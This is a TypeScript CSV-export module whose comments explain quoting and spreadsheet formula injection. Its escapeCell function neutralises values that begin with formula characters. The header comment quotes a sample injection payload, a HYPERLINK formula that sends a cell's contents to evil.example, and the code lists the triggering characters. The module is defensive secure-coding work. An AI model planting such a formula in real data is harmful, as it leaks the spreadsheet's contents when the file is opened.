/**
 * Writing CSV that a spreadsheet cannot be tricked by.
 *
 * Pure and dependency-free. There is no CSV library here on purpose: the format
 * is four rules, and the two that actually matter are the ones libraries most
 * often get wrong for this use case.
 *
 * RULE ONE, QUOTING. A field containing a comma, a quote, a newline or a
 * carriage return has to be wrapped in quotes, with embedded quotes doubled.
 * Miss it and one member's note with a comma in it silently shifts every
 * column to its right, for that row only, which is the sort of corruption
 * somebody finds three months later in a spreadsheet they have been making
 * decisions from.
 *
 * RULE TWO, AND THIS IS THE SECURITY ONE: FORMULA INJECTION. Excel, LibreOffice
 * and Google Sheets all evaluate a cell whose text begins with `=`, `+`, `-`,
 * `@`, or a tab or carriage return before one of those. A member who signs up
 * as `=HYPERLINK("https://evil.example/?"&A1,"click")@example.com` has written
 * a formula into an admin's spreadsheet, and it runs when the admin opens the
 * file, with their data and their machine. It is their export of our data that
 * attacks them.
 *
 * This is not theoretical for us. Emails and invite codes are user-controlled
 * and both go in the report. The defence is to prefix a tab, which spreadsheets
 * treat as text and which survives a round trip: the value is unchanged, it
 * simply is not executed. Quoting alone does NOT prevent this, which is the
 * trap, because a field that is correctly quoted still evaluates.
 *
 * OWASP call this CSV Injection. The read is worth ten minutes before anybody
 * "simplifies" `escapeCell` below.
 */

/** Characters a spreadsheet reads as the start of a formula. */
const FORMULA_STARTERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * One field, quoted if it needs to be and neutralised if it is dangerous.
 *
 * `null` and `undefined` become empty rather than the strings "null" and
 * "undefined", which is what a naive template produces and what makes a column
 * of blanks read as a column of data.
 */
export function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  // Formula neutralisation FIRST, so the tab is inside the quotes rather than
  // outside them, where it would be a field separator in a TSV and a stray
  // character here.
  if (s.length > 0 && FORMULA_STARTERS.has(s[0])) s = `\t${s}`;

  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/**
 * A CSV document from a header row and a list of rows.
 *
 * CRLF LINE ENDINGS, because RFC 4180 says so and because Excel on Windows
 * treats a bare LF inside a quoted field inconsistently. Anything reading this
 * on a Unix box copes with CRLF; the reverse is not reliably true.
 */
export function toCsv(headers: readonly string[], rows: readonly unknown[][]): string {
  const lines = [headers.map(escapeCell).join(",")];
  for (const row of rows) lines.push(row.map(escapeCell).join(","));
  return lines.join("\r\n");
}

/**
 * A filename that sorts chronologically and says what it holds.
 *
 * Dated because these files outlive the question that produced them: an
 * undated `report.csv` in a Downloads folder is unattributable within a week,
 * and somebody will eventually compare two of them.
 */
export function reportFilename(prefix: string, today: string): string {
  const safe = prefix.replace(/[^a-z0-9-]+/gi, "-").toLowerCase();
  return `${safe}-${today}.csv`;
}
